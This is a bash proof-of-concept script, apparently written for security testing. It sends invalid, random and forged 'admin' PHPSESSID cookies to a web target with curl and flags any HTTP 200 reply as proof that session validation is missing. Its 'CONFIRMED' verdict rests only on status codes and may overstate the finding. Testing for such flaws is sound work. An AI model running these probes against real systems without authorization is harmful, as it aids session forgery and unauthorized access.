#!/bin/bash

# POC: No Session Management - Arbitrary Session Cookies Accepted
# This script demonstrates that the application accepts arbitrary session cookies
# without proper validation, enabling session fixation and forged session attacks.

TARGET="${1:-http://localhost:8080}"
echo "[*] Session Management Vulnerability POC"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Check if server sets session cookies
echo "=== Test 1: Check for server-generated session cookies ==="
echo "[*] Making request without cookies to check if server sets any..."
RESPONSE=$(curl -s -D - "$TARGET/" 2>&1)
if echo "$RESPONSE" | grep -i "Set-Cookie" | grep -i "PHPSESSID"; then
    echo "[+] Server sets PHPSESSID cookie"
else
    echo "[-] No PHPSESSID cookie set by server"
fi
echo ""

# Test 2: Accept arbitrary invalid session cookie
echo "=== Test 2: Send arbitrary invalid session cookie ==="
INVALID_SESSION="PHPSESSID=INVALID_SESSION_12345"
echo "[*] Sending request with cookie: $INVALID_SESSION"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -b "$INVALID_SESSION" "$TARGET/index.php")
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Server accepted invalid session cookie (HTTP $HTTP_CODE)"
    VULN_FOUND=1
else
    echo "[-] Server rejected invalid session (HTTP $HTTP_CODE)"
fi
echo ""

# Test 3: Accept forged admin session cookie
echo "=== Test 3: Send forged admin session cookie ==="
FORGED_SESSION="PHPSESSID=admin_session_fake"
echo "[*] Sending request with cookie: $FORGED_SESSION"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -b "$FORGED_SESSION" "$TARGET/index.php")
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Server accepted forged admin session (HTTP $HTTP_CODE)"
    VULN_FOUND=1
else
    echo "[-] Server rejected forged session (HTTP $HTTP_CODE)"
fi
echo ""

# Test 4: Session cookie not required - same access without cookie
echo "=== Test 4: Compare access with and without session cookie ==="
echo "[*] Request without any session cookie..."
RESPONSE_NO_COOKIE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/index.php" 2>&1)
HTTP_NO_COOKIE=$(echo "$RESPONSE_NO_COOKIE" | grep "HTTP_CODE:" | cut -d: -f2)
echo "[*] HTTP Response: $HTTP_NO_COOKIE"

echo "[*] Request with arbitrary session cookie..."
RESPONSE_WITH_COOKIE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -b "PHPSESSID=RANDOM_VALUE_XYZ" "$TARGET/index.php" 2>&1)
HTTP_WITH_COOKIE=$(echo "$RESPONSE_WITH_COOKIE" | grep "HTTP_CODE:" | cut -d: -f2)
echo "[*] HTTP Response: $HTTP_WITH_COOKIE"

if [ "$HTTP_NO_COOKIE" = "$HTTP_WITH_COOKIE" ] && [ "$HTTP_NO_COOKIE" = "200" ]; then
    echo "[+] VULNERABLE: Same access with or without session cookie"
    echo "[+] This indicates no session validation is performed"
    VULN_FOUND=1
fi
echo ""

# Test 5: Multiple different session cookies all accepted
echo "=== Test 5: Accept multiple different arbitrary session values ==="
for i in {1..3}; do
    RANDOM_SESSION="PHPSESSID=SESSION_$(date +%s)_$RANDOM"
    echo "[*] Testing: $RANDOM_SESSION"
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -b "$RANDOM_SESSION" "$TARGET/index.php")
    if [ "$HTTP_CODE" = "200" ]; then
        echo "    [+] Accepted (HTTP $HTTP_CODE)"
        VULN_FOUND=1
    else
        echo "    [-] Rejected (HTTP $HTTP_CODE)"
    fi
done
echo ""

# Summary
echo "=== VULNERABILITY SUMMARY ==="
if [ "$VULN_FOUND" = "1" ]; then
    echo "[+] CONFIRMED: Application accepts arbitrary session cookies without validation"
    echo "[+] Impact: Session fixation and forged session attacks are possible"
    exit 0
else
    echo "[-] Could not confirm vulnerability"
    exit 1
fi